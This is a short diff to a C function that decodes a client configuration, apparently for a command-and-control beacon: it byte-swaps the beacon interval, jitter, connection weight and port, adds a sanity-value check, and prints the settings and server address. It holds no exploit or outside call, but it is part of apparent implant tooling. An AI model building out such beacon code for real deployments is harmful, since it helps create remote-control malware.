@@ -21,11 +21,29 @@ end:
 
 int DecryptConfig(client_config_t* config)
 {
-    int exit_code = EXIT_FAILURE;
-    config->beacon_interval = be64toh(config->beacon_interval);
-    config->beacon_jitter = be64toh(config->beacon_jitter);
-    config->connection_weight = be64toh(config->connection_weight);
+    int exit_code = EXIT_SUCCESS;
+
+    // I actually hate this so much oml i need to get better at how apks and apps work
+    if (config->sanity == SANITY_VALUE)
+    {
+        goto end;
+    }
     config->port = ntohs(config->port);
-    exit_code = EXIT_SUCCESS;
+    config->beacon_interval = be64toh(config->beacon_interval);
+    config->beacon_jitter = (int64_t)be64toh((uint64_t)config->beacon_jitter);
+    config->connection_weight = be64toh(config->connection_weight);
+    config->sanity = ntohs(config->sanity);
+
+    DPRINTF("BEACON INTERVAL: %llu\n", (unsigned long long)config->beacon_interval);
+    DPRINTF("BEACON JITTER: %lld\n", (long long)config->beacon_jitter);
+    DPRINTF("CONNECTION WEIGHT: %llu\n", (unsigned long long)config->connection_weight);
+    DPRINTF("PORT: %d\n", config->port);
+    DPRINTF("ADDRESS: %s\n", config->address);
+
+    if (config->sanity != SANITY_VALUE)
+    {
+        exit_code = EXIT_FAILURE;
+    }
+end:
     return exit_code;
 }
